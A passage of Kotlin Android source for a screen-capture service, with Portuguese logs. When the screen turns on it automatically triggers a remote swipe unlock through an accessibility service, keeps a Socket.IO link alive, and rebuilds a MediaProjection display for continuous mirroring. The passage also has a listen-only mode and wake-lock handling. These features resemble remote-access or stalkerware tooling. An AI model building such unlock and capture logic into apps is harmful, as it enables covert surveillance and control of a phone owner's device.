                                val autoDesbloquear = prefs.getBoolean(KEY_AUTO_DESBLOQUEAR_LIGACAO, true)
                                if (autoDesbloquear) {
                                    val kg = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                                    if (kg?.isKeyguardLocked == true) {
                                        Handler(Looper.getMainLooper()).postDelayed({
                                            val svc = MyAccessibilityService.instance
                                            if (svc != null) {
                                                svc.desbloquearSwipeRemoto()
                                                enviarLog("Auto-desbloqueio (swipe) disparado automaticamente no SCREEN_ON.")
                                            }
                                        }, 1000L)
                                    }
                                }
                            } catch (e: Exception) {
                                enviarLog("Aviso auto-desbloqueio no SCREEN_ON: ${e.message}")
                            }
                        }
                        Intent.ACTION_USER_PRESENT -> {
                            isScreenOn = true
                            enviarLog("USER_PRESENT detectado — tela desbloqueada; garantindo conexão Socket.IO e retomando espelhamento normal.")
                            
                            SocketManager.garantirConexao()
                            removerOverlayMantemTelaAcesa()
                            MyAccessibilityService.instance?.pararCapturaAcessibilidade()

                            Handler(Looper.getMainLooper()).postDelayed({
                                recriarVirtualDisplay(force = true)
                            }, 300L)
                        }
                    }
                }
            }
            val filter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiverTelaLigada, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(receiverTelaLigada, filter)
            }
            receiverTelaRegistrado = true
            Log.d(TAG, "Receiver de SCREEN_ON/SCREEN_OFF/USER_PRESENT registrado com sucesso.")
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao registrar receiver de estado da tela: ${e.message}")
        }
    }

    private fun recriarVirtualDisplay(force: Boolean = false) {
        if (mediaProjection == null || modoSomenteEscuta) {
            enviarLog("Recriação de VirtualDisplay ignorada (sem MediaProjection ou modo escuta).")
            return
        }
        if (recriandoDisplay) {
            enviarLog("Recriação de VirtualDisplay ignorada: já há uma em andamento.")
            return
        }
        val framesFluindo = !force && (System.currentTimeMillis() - ultimoFrameMs < 1500)
        if (framesFluindo) {
            enviarLog("Recriação de VirtualDisplay ignorada: frames fluindo normalmente.")
            return
        }
        recriandoDisplay = true
        try {
            keepAliveRunnable?.let { backgroundHandler?.removeCallbacks(it) }
            keepAliveRunnable = null
            virtualDisplay?.release()
            virtualDisplay = null
            try { imageReader?.close() } catch (_: Exception) {}
            imageReader = null
            try { handlerThread?.quitSafely() } catch (_: Exception) {}
            handlerThread = null
            backgroundHandler = null
            primeiroFrame = true
            startVirtualDisplay()
            enviarLog("VirtualDisplay RECRIADO com sucesso (force=$force) — espelhamento de tela reativado.")
        } catch (e: Exception) {
            enviarLog("ERRO ao recriar VirtualDisplay: ${e.message}")
            Log.e(TAG, "Erro ao recriar VirtualDisplay: ${e.message}", e)
        } finally {
            recriandoDisplay = false
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        liberarWakeLocks()
        pararWatchdogAntiCongelamento()
        removerOverlayMantemTelaAcesa()
        WebRtcStreamer.parar()
        MyAccessibilityService.instance?.pararCapturaAcessibilidade()
        if (receiverTelaRegistrado) {
            try {
                receiverTelaLigada?.let { unregisterReceiver(it) }
            } catch (_: Exception) {}
            receiverTelaLigada = null
            receiverTelaRegistrado = false
        }
        try {
            h264ScreenEncoder?.stop()
        } catch (_: Exception) {}
        h264ScreenEncoder = null
        imageReader?.close()
        virtualDisplay?.release()
        mediaProjection?.stop()
        handlerThread?.quitSafely()
        handlerThread = null
        backgroundHandler = null
        isRunning = false
        modoSomenteEscuta = false
        Log.d(TAG, "ScreenCaptureService destruído")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
